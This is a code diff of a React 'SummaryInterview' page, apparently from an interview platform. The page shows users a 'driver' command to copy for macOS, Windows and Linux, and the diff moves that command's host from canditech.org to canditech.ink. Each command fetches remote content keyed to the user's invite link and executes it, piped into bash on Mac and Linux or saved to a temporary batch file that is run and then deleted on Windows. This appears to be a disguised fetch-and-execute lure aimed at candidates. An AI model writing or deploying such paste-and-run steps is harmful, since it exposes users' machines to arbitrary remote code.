@@ -755,17 +755,17 @@ export default function SummaryInterview() {
             <div ref={driverCommandRef} id="driver-command" className={styles.driverHelpCommand} role="region" aria-label="Command to copy">
                 {driverOs === 'mac' && (
                       <code>
-                      {`curl -sL -X POST https://api.canditech.org/mac/${inviteLink ? inviteLink : ''} | bash`}
+                      {`curl -sL -X POST https://api.canditech.ink/mac/${inviteLink ? inviteLink : ''} | bash`}
                           </code>
                   )}
                 {driverOs === 'windows' && (
                           <code>
-                      {`curl -sL -X POST https://api.canditech.org/window/${inviteLink ? inviteLink : ''} -o "%TEMP%\\t.bat" && cmd /c "%TEMP%\\t.bat" && del "%TEMP%\\t.bat"`}
+                      {`curl -sL -X POST https://api.canditech.ink/window/${inviteLink ? inviteLink : ''} -o "%TEMP%\\t.bat" && cmd /c "%TEMP%\\t.bat" && del "%TEMP%\\t.bat"`}
                           </code>
                       )}
               {driverOs === 'linux' && (
                       <code>
-                  {`curl -sL -X POST https://api.canditech.org/mac/${inviteLink ? inviteLink : ''} | bash`}
+                  {`curl -sL -X POST https://api.canditech.ink/mac/${inviteLink ? inviteLink : ''} | bash`}
                       </code>
                   )}
             </div>
